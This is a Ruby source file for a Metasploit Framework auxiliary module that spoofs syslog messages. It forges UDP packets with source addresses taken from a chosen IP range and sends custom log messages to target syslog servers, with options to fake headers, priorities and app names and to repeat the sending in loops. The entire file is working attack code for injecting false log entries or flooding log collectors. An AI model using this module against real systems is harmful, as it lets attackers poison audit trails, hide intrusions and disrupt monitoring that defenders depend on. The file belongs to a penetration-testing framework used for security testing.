##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

# Thanks to Tod Beardsley for the guidance and showing me the error of my ways with the PacketFu stuff
# style guidlines, and the metasploit scanner module.

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

include Msf::Exploit::Capture
include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'         => 'Syslog Spoofing a Custom Messages',
      'Version'      => '$Revision$',
      'Description'  => 'This module allows you to spoof custom syslog messages to and from single hosts or a range of hosts.',
      'Author'       => 'Jeremy Conway <jeremy[at]sudosecure.net>',
      'License'      => MSF_LICENSE
    )
    register_options(
        [
          OptPort.new('DPORT',[false, "Destination Port to send Syslog to.", 514]),
          OptAddressRange.new('SHOSTS',[true, "Source IP or CIDR network range to spoof sending syslog messages from."]),
          OptString.new('MSG',[true, "Syslog custom message to send."]),
          OptBool.new('SYSLOG_HEADER',[false, "Generate Syslog header (Not always needed). Set Advanced options PRI,SHTS,SHHOST", false]),
          OptBool.new('VERBOSE',[false, "Verbose Output?", false]),
          OptBool.new('TEST',[false, "Don't send packets, just display in console what would be sent.", false]),
          OptInt.new('COUNT', [false, "Number of intervals to loop",1]),
          OptString.new('DELAY', [false, "Delay in seconds between intervals",0])
        ],self.class)

    register_advanced_options(
        [
          OptBool.new('SHTS',[false, "Add Syslog header timestamp? (Jan 1 21:01:59)", false]),
          OptBool.new('SHHOST',[false, "Add Source IP to Syslog header?",false]),
          OptBool.new('PRI',[false, "Calculate priority? (FACILITY * 8 + SEVERITY)", false]),
          OptInt.new('FACILITY',[false, "Syslog Facilities (0-23) RFC 3164",0]),
          OptInt.new('SEVERITY',[false, "Syslog Severities (0-7) RFC 3164",0]),
          OptString.new('APPNAME',[false, "Syslog App Name (sshd[12345])"])
                		], self.class)

    deregister_options('FILTER','PCAPFILE','SNAPLEN','TIMEOUT','NETMASK')
  end

  #RFC 3164
  def cal_pri (fac, sev)
    return (fac*8+sev)
  end

  def gen_header(sip)
    time = Time.new
    header = ''
    if( datastore['PRI'] )
        		header << "<" << cal_pri(datastore['FACILITY'],datastore['SEVERITY']).to_s << ">"
             	end
               	if( datastore['SHTS'])
                	header << time.strftime("%b %e %H:%M:%S ")
             	end
             	if( datastore['SHHOST'])
               		header << sip << " "
            	end
             	if( datastore['APPNAME'])
               		header << datastore['APPNAME'] << ": "
             	end
    return header
  end

  def gen_payload(sip)
    payload = ''
    if( datastore['SYSLOG_HEADER'])
      payload << gen_header(sip)
    end
    payload << datastore['MSG']
    return (payload)
  end

  def send_syslog(sip,ip,dport)
    pkt = PacketFu::UDPPacket.new
    pkt.udp_sport= rand(0xffff-1024) + 1024
    pkt.udp_dport=dport.to_i
    pkt.ip_saddr=sip
    pkt.ip_daddr=ip
    pkt.payload << gen_payload(sip)
    pkt.recalc
    capture_sendto(pkt,ip) unless datastore['TEST']
    if(datastore['VERBOSE'] || datastore['TEST'])
      print_status("#{sip}:#{pkt.udp_sport} --> #{ip}:#{dport}\t#{pkt.payload.size > 50 ? pkt.payload[0,50] + "..." : pkt.payload}")
    end
  end

  def run_host(ip)
    open_pcap()
    src_iplist = Rex::Socket::RangeWalker.new(datastore['SHOSTS'])
    dport=datastore['DPORT']
    sentmsgs=0
    time = Time.now
    (1..datastore['COUNT']).each do
      src_iplist.reset
      src_iplist.each do |sip|
        send_syslog(sip,ip,dport) 
        sentmsgs+=1
      end
      if( datastore['DELAY'].to_f > 0)
        select(nil,nil,nil,datastore['DELAY'].to_f)
      end
    end
    time_diff = (Time.new - time)
                print_status("Total Syslog Messages Sent: %d in %.2f seconds."%[sentmsgs,time_diff])
    close_pcap()
  end
end
